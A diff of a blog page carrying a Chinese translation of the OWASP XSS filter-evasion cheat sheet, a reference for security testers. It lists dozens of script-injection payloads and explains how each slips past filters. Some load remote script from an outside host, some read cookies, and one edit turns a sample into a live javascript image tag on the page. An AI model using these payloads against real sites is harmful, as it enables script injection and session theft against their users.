@@ -112,7 +112,7 @@
 <meta property="og:site_name" content="Guoker">
 <meta property="og:description" content="XSS Filter Evasion Cheat Sheet 中文版译者注：翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常的价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅是简单的把文中的各种代码复制下来，然后看起来很刁的发在各种论坛上，不过你要真去认真研读这些代码，就会完全不知所云了。原因是这篇文章最精华的部分是代码的解释而非代码本身。 一方面为了自己学习，一方">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-10-31T14:42:16.040Z">
+<meta property="og:updated_time" content="2017-11-01T17:31:05.877Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【转载】XSS Filter Evasion Cheat Sheet 中文版">
 <meta name="twitter:description" content="XSS Filter Evasion Cheat Sheet 中文版译者注：翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常的价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅是简单的把文中的各种代码复制下来，然后看起来很刁的发在各种论坛上，不过你要真去认真研读这些代码，就会完全不知所云了。原因是这篇文章最精华的部分是代码的解释而非代码本身。 一方面为了自己学习，一方">
@@ -428,146 +428,145 @@
 <p>谢谢</p>
 <p>源文档地址：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
 <p>翻译文档github地址：<a href="https://github.com/caomulaodao/XSS-Filter-Evasion-Cheat-Sheet-CN" target="_blank" rel="external">https://github.com/caomulaodao/XSS-Filter-Evasion-Cheat-Sheet-CN</a></p>
-<p>#介绍#<br>这篇文章的主要目的是去给应用安全测试者提供一份xss漏洞检测指南。文章的初始内容由RSnake提供给OWASP，从他的xss备忘录: <a href="http://ha.ckers.org/xss.html" target="_blank" rel="external">http://ha.ckers.org/xss.html</a> 。目前这个网页已经重定向到我们这里，我们打算维护和完善它。OWASP的第一个防御备忘录项目：the XSS (Cross Site Scripting) Prevention Cheat Sheet灵感来源于RSnake的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者去帮助他们预防xss漏洞，而不是创建一个复杂的备忘录去简单的告诉他们需要去预防各种千奇百怪的攻击。所以，OWASP备忘录系列诞生了。</p>
+<p>#介绍<br>这篇文章的主要目的是去给应用安全测试者提供一份xss漏洞检测指南。文章的初始内容由RSnake提供给OWASP，从他的xss备忘录: <a href="http://ha.ckers.org/xss.html" target="_blank" rel="external">http://ha.ckers.org/xss.html</a> 。目前这个网页已经重定向到我们这里，我们打算维护和完善它。OWASP的第一个防御备忘录项目：the XSS (Cross Site Scripting) Prevention Cheat Sheet灵感来源于RSnake的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者去帮助他们预防xss漏洞，而不是创建一个复杂的备忘录去简单的告诉他们需要去预防各种千奇百怪的攻击。所以，OWASP备忘录系列诞生了。</p>
 <hr>
-<p>#测试#<br>这个备忘录主要针对那些已经理解了最基本的xss攻击，但是想要深入理解各种过滤器绕过的细微差别的学习者。</p>
+<p>#测试<br>这个备忘录主要针对那些已经理解了最基本的xss攻击，但是想要深入理解各种过滤器绕过的细微差别的学习者。</p>
 <p>请注意大部分的xss攻击向量已经在其代码下方给出了测试过的浏览器列表。</p>
 <hr>
-<p>##xss 探测器##<br>注入下面这些代码，在大多数没有特殊xss向量要求而易遭受脚本攻击的地方将会弹出单词“xss”。使用<a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">url编码器</a>去编码你的整个代码。小技巧：如果你是急切的需要快去检测一个页面，通常只需要注入轻量的 “&lt;任意字符&gt;” 标签，然后判断输出点是否受到干扰就可以判断是否xss漏洞了。</p>
+<p>##xss 探测器<br>注入下面这些代码，在大多数没有特殊xss向量要求而易遭受脚本攻击的地方将会弹出单词“xss”。使用<a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">url编码器</a>去编码你的整个代码。小技巧：如果你是急切的需要快去检测一个页面，通常只需要注入轻量的 “&lt;任意字符&gt;” 标签，然后判断输出点是否受到干扰就可以判断是否xss漏洞了。</p>
 <pre><code>&apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;;
 alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
 &gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
 </code></pre><hr>
-<p>##xss 探测器2##<br>如果你没有充足的输入空间去检测页面是否存在xss漏洞。下面这段代码是一个好的简洁的xss注入检测代码。在注入这段代码后，查看页面源代码寻找是否存在看起来像 &lt;XSS verses &lt;XSS这样的输出点从而判断是否存在xss漏洞。</p>
+<p>##xss 探测器2<br>如果你没有充足的输入空间去检测页面是否存在xss漏洞。下面这段代码是一个好的简洁的xss注入检测代码。在注入这段代码后，查看页面源代码寻找是否存在看起来像 &lt;XSS verses &lt;XSS这样的输出点从而判断是否存在xss漏洞。</p>
 <pre><code>&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
 </code></pre><hr>
-<p>##无过滤绕过##<br>这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）</p>
+<p>##无过滤绕过<br>这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）</p>
 <pre><code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
 </code></pre><hr>
 <hr>
-<p>##通过javascript指令实现的图片xss##</p>
+<p>##通过javascript指令实现的图片xss</p>
 <p>图片xss依靠javascript指令实现。（IE7.0不支持javascript指令在图片上下文中，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理。）</p>
 <pre><code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##无引号无分号##</p>
+<p>##无引号无分号</p>
 <pre><code>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
 </code></pre><hr>
-<p>##不区分大小写的xss攻击向量##</p>
+<p>##不区分大小写的xss攻击向量</p>
 <pre><code>&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
 </code></pre><hr>
-<p>##html 实体##<br>The semicolons are required for this to work:</p>
+<p>##html 实体<br>The semicolons are required for this to work:</p>
 <pre><code>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
 </code></pre><hr>
-<p>##重音符混淆##<br>如果你的javascript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包裹javascript代码。它也经常会非常有用因为xss过滤代码未考虑到这个字符。</p>
+<p>##重音符混淆<br>如果你的javascript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包裹javascript代码。它也经常会非常有用因为xss过滤代码未考虑到这个字符。</p>
 <pre><code>&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
 </code></pre><hr>
-<p>##畸形的A标签##<br>跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器</p>
+<p>##畸形的A标签<br>跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器</p>
 <pre><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
 </code></pre><p>此外，chrome浏览器喜欢去补全缺失的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你补全缺失的引号在URL和script中。</p>
 <pre><code>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
 </code></pre><hr>
-<p>##畸形的IMG标签##<br>最早被 Begeek发现（可以短小而干净的运行于任何浏览器），这个xss向量依靠松散的渲染引擎解析IMG标签中被引号包含的字符串来实现。我猜测它最初是为了正确编码而这样实现，但这样让它更加困难去解析html。</p>
+<p>##畸形的IMG标签<br>最早被 Begeek发现（可以短小而干净的运行于任何浏览器），这个xss向量依靠松散的渲染引擎解析IMG标签中被引号包含的字符串来实现。我猜测它最初是为了正确编码而这样实现，但这样让它更加困难去解析html。</p>
 <pre><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
 </code></pre><hr>
-<p>##fromCharCode##<br>如果没有任何形式的引号被允许，你可以eval()一串fromCharCode在javascript中来创建任何你需要的xss向量。</p>
+<p>##fromCharCode<br>如果没有任何形式的引号被允许，你可以eval()一串fromCharCode在javascript中来创建任何你需要的xss向量。</p>
 <pre><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
 </code></pre><hr>
-<p>##默认SRC属性去绕过SRC域名检测过滤器##<br>这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于任何一个HTML标签，例如Form、Iframe、Input、Embed等等。它也允许任何该标签的相关事件去替换，例如onblur, onclick等，后面我们会附加一个可用的事件列表。由David Cross提供，Abdullah Hussam编辑。</p>
+<p>##默认SRC属性去绕过SRC域名检测过滤器<br>这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于任何一个HTML标签，例如Form、Iframe、Input、Embed等等。它也允许任何该标签的相关事件去替换，例如onblur, onclick等，后面我们会附加一个可用的事件列表。由David Cross提供，Abdullah Hussam编辑。</p>
 <pre><code>&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##默认SRC属性通过省略它的值##</p>
+<p>##默认SRC属性通过省略它的值</p>
 <pre><code>&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##默认SRC属性通过完全不设置它##</p>
+<p>##默认SRC属性通过完全不设置它</p>
 <pre><code>&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##通过error事件触发alert##</p>
+<p>##通过error事件触发alert</p>
 <pre><code>&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;
 </code></pre><hr>
-<p>##十进制html编码引用##<br>所有在<img>中使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS <a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">Calculator</a> 获取更多信息。</p>
+<p>##十进制html编码引用<br>所有在<img>中使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS <a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">Calculator</a> 获取更多信息。</p>
 <pre><code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
 &amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 </code></pre><hr>
-<p>##结尾没有分号的十进制html编码引用##<br>它是经常有用的在绕过寻找”&#XX;”格式的xss过滤，因为大多数人不知道最多允许7位字符的编码限制。这也是有用的对那些对字符串解码像$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/; 的过滤器,它们错误的认为一个html编码必须要用;去结束。（我是无意中发现）</p>
+<p>##结尾没有分号的十进制html编码引用<br>它是经常有用的在绕过寻找”&#XX;”格式的xss过滤，因为大多数人不知道最多允许7位字符的编码限制。这也是有用的对那些对字符串解码像$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/; 的过滤器,它们错误的认为一个html编码必须要用;去结束。（我是无意中发现）</p>
 <pre><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
 </code></pre><hr>
-<p>##结尾没有分号的十六进制html编码引用##<br>这也是一种实用的xss攻击针对上文的$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/; ，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此），。使用 XSS <a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">Calculator</a> 获取更多信息。</p>
+<p>##结尾没有分号的十六进制html编码引用<br>这也是一种实用的xss攻击针对上文的$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/; ，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此），。使用 XSS <a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">Calculator</a> 获取更多信息。</p>
 <pre><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
 </code></pre><hr>
-<p>##内嵌TAB##<br>用来分开xss攻击代码</p>
+<p>##内嵌TAB<br>用来分开xss攻击代码</p>
 <pre><code>&lt;IMG SRC=&quot;jav    ascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##内嵌被编码的TAB##<br>用来分开xss攻击代码</p>
+<p>##内嵌被编码的TAB<br>用来分开xss攻击代码</p>
 <pre><code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##内嵌换行符去分开xss代码##<br>一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表为更详细的信息。下面四个xss例子展示了这个向量。</p>
+<p>##内嵌换行符去分开xss代码<br>一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表为更详细的信息。下面四个xss例子展示了这个向量。</p>
 <pre><code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##编码回车符去分开xss代码##<br>注意：上面我编写的三个xss字符串比必须长度的字符串更长，原因是0可以被省略。通常我看到的过滤器假设十六进制和十进制的编码是两到三个字符，正确的应该是一到七个字符。</p>
+<p>##编码回车符去分开xss代码<br>注意：上面我编写的三个xss字符串比必须长度的字符串更长，原因是0可以被省略。通常我看到的过滤器假设十六进制和十进制的编码是两到三个字符，正确的应该是一到七个字符。</p>
 <pre><code>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##没有分割的javascript指令##<br>null字符也可以作为一个xss向量，但不同于上面。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器通过变动像这个例子中的。</p>
+<p>##没有分割的javascript指令<br>null字符也可以作为一个xss向量，但不同于上面。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器通过变动像这个例子中的。</p>
 <pre><code>perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out
 </code></pre><hr>
-<p>##IMG中javascript之前添加空格和元字符为xss绕过##<br>xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。</p>
+<p>##IMG中javascript之前添加空格和元字符为xss绕过<br>xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。</p>
 <pre><code>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##非字母数字字符的xss##<br> Firefox html解析器认为一个非数字字母的字符在一个html关键字中不是有效的，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。例如，”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”:</p>
+<p>##非字母数字字符的xss<br> Firefox html解析器认为一个非数字字母的字符在一个html关键字中不是有效的，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。例如，”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”:</p>
 <pre><code>&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
 </code></pre><p>和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。借此我们可以绕过xss过滤器。注意这也是适用于重音符如下所示：</p>
 <pre><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
 </code></pre><p>Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不使用空格的情况下，Gecko仅允许一个斜杠在html标签和参数之间。这可能是有用的在那些不允许输入空格的系统中。</p>
 <pre><code>&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
 </code></pre><hr>
-<p>##额外的开括号##<br> Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。最后，代码中的双斜杠可以抑制额外尖括号导致的javascript错误。</p>
+<p>##额外的开括号<br> Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。最后，代码中的双斜杠可以抑制额外尖括号导致的javascript错误。</p>
 <pre><code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
 </code></pre><hr>
-<p>##没关闭的script标签##<br>对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;&#x3C;&#x2F;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3E;”这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。</p>
+<p>##没关闭的script标签<br>对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;&#x3C;&#x2F;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3E;”这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。</p>
 <pre><code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
 </code></pre><hr>
-<p>##script标签中的协议解析#<br>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。</p>
+<p>##script标签中的协议解析<br>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。</p>
 <pre><code>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
 </code></pre><hr>
-<p>##半开的HTML/JavaScript xss向量##<br>不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指令在IMG标签中，这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以使用这个xss向量在任何html标签中，甚至没有用”&gt;”闭合标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 它也是有效的去对付真实的xss过滤器，我曾经用半开的&lt;IFRAME 标签替代 &lt;IMG 标签去绕过过滤器。</p>
+<p>##半开的HTML/JavaScript xss向量<br>不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指令在IMG标签中，这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以使用这个xss向量在任何html标签中，甚至没有用”&gt;”闭合标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 它也是有效的去对付真实的xss过滤器，我曾经用半开的&lt;IFRAME 标签替代 &lt;IMG 标签去绕过过滤器。</p>
 <pre><code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
 </code></pre><hr>
-<p>##双开尖括号##<br>使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。</p>
+<p>##双开尖括号<br>使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。</p>
 <pre><code>&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
 </code></pre><hr>
-<p>##转义javascript中的转义##<br>当一个应用程序是输出用户自定义的信息到javascript代码中时，例如： &#x3C;SCRIPT&gt;var a=”$ENV{QUERY_STRING}”;&#x3C;/SCRIPT&gt;。如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过再转义被转义的字符来绕过它。因此使最终的输入代码类似于&#x3C;SCRIPT&gt;var a=”\“;alert(‘XSS’);//“;&#x3C;/SCRIPT&gt; 。最终\转义了双引号前被服务器添加的\，从而使双引号不会被转义，因此触发xss向量。xss定位器使用这个方法。</p>
+<p>##转义javascript中的转义<br>当一个应用程序是输出用户自定义的信息到javascript代码中时，例如： &#x3C;SCRIPT&gt;var a=”$ENV{QUERY_STRING}”;&#x3C;/SCRIPT&gt;。如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过再转义被转义的字符来绕过它。因此使最终的输入代码类似于&#x3C;SCRIPT&gt;var a=”\“;alert(‘XSS’);//“;&#x3C;/SCRIPT&gt; 。最终\转义了双引号前被服务器添加的\，从而使双引号不会被转义，因此触发xss向量。xss定位器使用这个方法。</p>
 <pre><code>\&quot;;alert(&apos;XSS&apos;);//
 </code></pre><hr>
-<p>##闭合title标签##<br>这是一个简单的xss向量，可以引入一个恶意的xss攻击。<br><em>译者注：titile标签内部不支持html代码，所有内容会被自动转义为普通字符。</em></p>
+<p>##闭合title标签<br>这是一个简单的xss向量，可以引入一个恶意的xss攻击。<br><em>译者注：titile标签内部不支持html代码，所有内容会被自动转义为普通字符。</em></p>
 <pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
 </code></pre><hr>
-<p>##INPUT image##</p>
+<p>##INPUT image</p>
 <pre><code>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##BODY image##</p>
+<p>##BODY image</p>
 <pre><code>&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##IMG DYNSRC(视频剪辑) ##</p>
+<p>##IMG DYNSRC(视频剪辑) </p>
 <pre><code>&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##IMG lowsrc（低分辨率图片）##</p>
-<pre><code>&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
-</code></pre><hr>
-<p>##List-style-image##</p>
+<p>##IMG lowsrc（低分辨率图片）#<br>    <img lowsrc="javascript:alert('XSS')"></p>
+<hr>
+<p>##List-style-image</p>
 <pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
 </code></pre><hr>
-<p>##List-style-image##<br>为符号列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为使用了javascript指令。这不是一个特别有用的xss向量。</p>
+<p>##List-style-image<br>为符号列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为使用了javascript指令。这不是一个特别有用的xss向量。</p>
 <pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
 </code></pre><hr>
-<p>##VBscript in an image##</p>
+<p>##VBscript in an image</p>
 <pre><code>&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
 </code></pre><hr>
-<p>##Livescript (仅适用于老版本的Netscape)##</p>
+<p>##Livescript (仅适用于老版本的Netscape)</p>
 <pre><code>&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
 </code></pre><hr>
-<p>##BODY 标签##<br>这个方法不需要使用任何”javascript:” 或 “&lt;SCRIPT…” 的变体去实现xss攻击。Dan Crowley特别指出你可以额外的加入一个空格在等号之前(“onload=” != “onload =”):</p>
+<p>##BODY 标签<br>这个方法不需要使用任何”javascript:” 或 “&lt;SCRIPT…” 的变体去实现xss攻击。Dan Crowley特别指出你可以额外的加入一个空格在等号之前(“onload=” != “onload =”):</p>
 <pre><code>&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
 </code></pre><hr>
-<p>##事件处理程序##<br>它可以被用于上文中的一些共性xss攻击（这是最完整的一个实时更新的在线列表）。感谢Rene Ledosquet 的更新。此外你可以参考 <a href="http://help.dottoro.com/" target="_blank" rel="external">Dottoro Web Reference</a> 或是 <a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="external">events in JavaScript</a>.</p>
+<p>##事件处理程序<br>它可以被用于上文中的一些共性xss攻击（这是最完整的一个实时更新的在线列表）。感谢Rene Ledosquet 的更新。此外你可以参考 <a href="http://help.dottoro.com/" target="_blank" rel="external">Dottoro Web Reference</a> 或是 <a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="external">events in JavaScript</a>.</p>
 <ol>
 <li>FSCommand() (攻击者可以使用它当执行一个嵌入的flash对象时)</li>
 <li>onAbort() (当使用者终止一张正在载入的图片)</li>
@@ -675,105 +674,105 @@ alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83)
 <li>seekSegmentTime() (this is a method that locates the specified point on the element’s segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)</li>
 </ol>
 <hr>
-<p>##BGSOUND(背景音乐)##</p>
+<p>##BGSOUND(背景音乐)</p>
 <pre><code>&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##&amp; JavaScript 包含##</p>
+<p>##&amp; JavaScript 包含</p>
 <pre><code>&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
 </code></pre><hr>
-<p>##样式表##</p>
+<p>##样式表</p>
 <pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##远程样式表##<br>（通过某些方式例如最简单的远程样式表，你可以在表达式类型的样式参数中嵌入xss代码）。它是仅仅工作在IE浏览器或是使用了IE渲染引擎的Netscape 8.1+。需要注意的是页面中并没有展现出它包含了javascript代码。注意：所有的远程样式表xss需要至少页面包含body标签，否则将无法工作。或者页面中包含除了向量本身外的其他内容。因此如果它是一个空白页面，你需要添加至少一个字母到页面确保它可以工作。</p>
